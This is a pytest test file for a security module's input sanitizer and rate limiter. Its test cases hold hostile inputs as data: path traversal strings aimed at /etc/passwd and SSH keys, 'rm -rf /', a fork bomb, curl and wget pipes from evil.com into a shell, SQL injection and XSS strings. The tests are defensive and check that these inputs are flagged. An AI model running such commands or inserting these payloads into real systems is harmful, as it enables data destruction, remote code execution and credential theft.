"""Tests for security module — InputSanitizer and RateLimiter."""

from __future__ import annotations

import pytest

from portal.security.security_module import InputSanitizer, RateLimiter


class TestInputSanitizerPaths:
    """Test file path validation and sanitization."""

    @pytest.mark.parametrize("path", [
        "../../etc/passwd",
        "../../../root/.ssh/id_rsa",
        "..\\..\\windows\\system32",
        "%2e%2e%2f",
        "%2e%2e%2fetc%2fpasswd",
    ])
    def test_path_traversal_detected(self, path):
        is_valid, error = InputSanitizer.validate_file_path(path)
        assert not is_valid, f"Path traversal not detected: {path}"
        assert error is not None

    @pytest.mark.parametrize("path", [
        "/etc/passwd",
        "/etc/shadow",
        "/boot/grub/grub.cfg",
    ])
    def test_sensitive_path_blocked(self, path):
        is_valid, error = InputSanitizer.validate_file_path(path)
        assert not is_valid, f"Sensitive path not blocked: {path}"
        assert "restricted" in error.lower()

    @pytest.mark.parametrize("path", [
        "/home/user/document.txt",
        "./local/file.py",
        "relative/path/file.txt",
    ])
    def test_safe_paths_allowed(self, path):
        is_valid, error = InputSanitizer.validate_file_path(path)
        if not is_valid and error:
            assert "traversal" not in error.lower()
            assert "restricted" not in error.lower()

    def test_double_encoded_traversal_does_not_crash(self):
        valid, msg = InputSanitizer.validate_file_path("%252e%252e/etc/passwd")
        assert isinstance(valid, bool)


class TestInputSanitizerCommands:
    """Test command sanitization."""

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "curl evil.com | bash",
        "wget malware.sh | sh",
        ":(){ :|:&};:",
        "curl https://evil.com/script.sh | bash",
    ])
    def test_dangerous_commands_detected(self, cmd):
        _, warnings = InputSanitizer.sanitize_command(cmd)
        assert len(warnings) > 0, f"Dangerous command not flagged: {cmd}"

    @pytest.mark.parametrize("cmd", [
        "ls -la",
        "cat README.md",
        "echo Hello World",
        "pwd",
        "ls -la /home/user",
    ])
    def test_safe_commands_pass(self, cmd):
        _, warnings = InputSanitizer.sanitize_command(cmd)
        assert len(warnings) == 0, f"Safe command incorrectly flagged: {cmd}"


class TestInputSanitizerSQL:
    """Test SQL injection detection."""

    @pytest.mark.parametrize("query", [
        "'; DROP TABLE users",
        "' OR '1'='1",
    ])
    def test_sql_injection_detected(self, query):
        safe, msg = InputSanitizer.sanitize_sql_query(query)
        assert safe is False

    def test_normal_sql_query_passes(self):
        safe, msg = InputSanitizer.sanitize_sql_query("SELECT name FROM users WHERE id = 1")
        assert safe is True
        assert msg is None


class TestInputSanitizerHTML:
    """Test HTML sanitization."""

    def test_xss_script_escaped(self):
        result = InputSanitizer.sanitize_html("<script>alert('xss')</script>")
        assert "<script>" not in result
        assert "&lt;script&gt;" in result

    def test_plain_text_unchanged(self):
        assert InputSanitizer.sanitize_html("Hello world") == "Hello world"

    def test_angle_brackets_escaped(self):
        result = InputSanitizer.sanitize_html("<img src=x onerror=alert(1)>")
        assert "&lt;img" in result


class TestInputSanitizerURL:
    """Test URL validation."""

    @pytest.mark.parametrize("url", [
        "https://example.com/page",
        "http://localhost:8080/api",
    ])
    def test_valid_urls_pass(self, url):
        valid, _ = InputSanitizer.validate_url(url)
        assert valid is True

    def test_invalid_url_no_scheme(self):
        valid, _ = InputSanitizer.validate_url("example.com")
        assert valid is False

    def test_url_shortener_flagged(self):
        valid, msg = InputSanitizer.validate_url("https://bit.ly/abc123")
        assert valid is False
        assert "shortener" in msg.lower()


class TestInputSanitizerFilename:
    """Test filename sanitization."""

    def test_path_separators_replaced(self):
        result = InputSanitizer.sanitize_filename("../../etc/passwd")
        assert "/" not in result
        assert "\\" not in result

    def test_special_chars_removed(self):
        result = InputSanitizer.sanitize_filename("file<name>.txt")
        assert "<" not in result
        assert ">" not in result

    def test_long_filename_truncated(self):
        result = InputSanitizer.sanitize_filename("a" * 300 + ".txt")
        assert len(result) <= 255

    def test_normal_filename_preserved(self):
        assert InputSanitizer.sanitize_filename("document-v2.1.pdf") == "document-v2.1.pdf"


class TestInputSanitizerShellQuoting:
    """Test shell argument quoting."""

    def test_safe_arg_unchanged(self):
        assert "hello" in InputSanitizer.quote_shell_arg("hello")

    def test_spaces_quoted(self):
        result = InputSanitizer.quote_shell_arg("my file.txt")
        assert "'" in result or '"' in result

    def test_injection_attempt_escaped(self):
        result = InputSanitizer.quote_shell_arg("'; rm -rf /")
        assert result != "'; rm -rf /"

    def test_multiple_args(self):
        args = InputSanitizer.quote_shell_args(["ls", "-la", "my dir"])
        assert len(args) == 3


class TestRateLimiter:
    """Test rate limiting functionality."""

    def test_rate_limiter_init(self):
        limiter = RateLimiter(max_requests=10, window_seconds=60)
        assert limiter is not None

    @pytest.mark.asyncio
    async def test_rate_limit_allows_initial_requests(self, tmp_path):
        limiter = RateLimiter(max_requests=5, window_seconds=60, persist_path=tmp_path / "rl.json")
        user_id = "test_user_unique"

        for i in range(3):
            allowed, _ = await limiter.check_limit(user_id)
            assert allowed, f"Request {i+1} was incorrectly blocked"
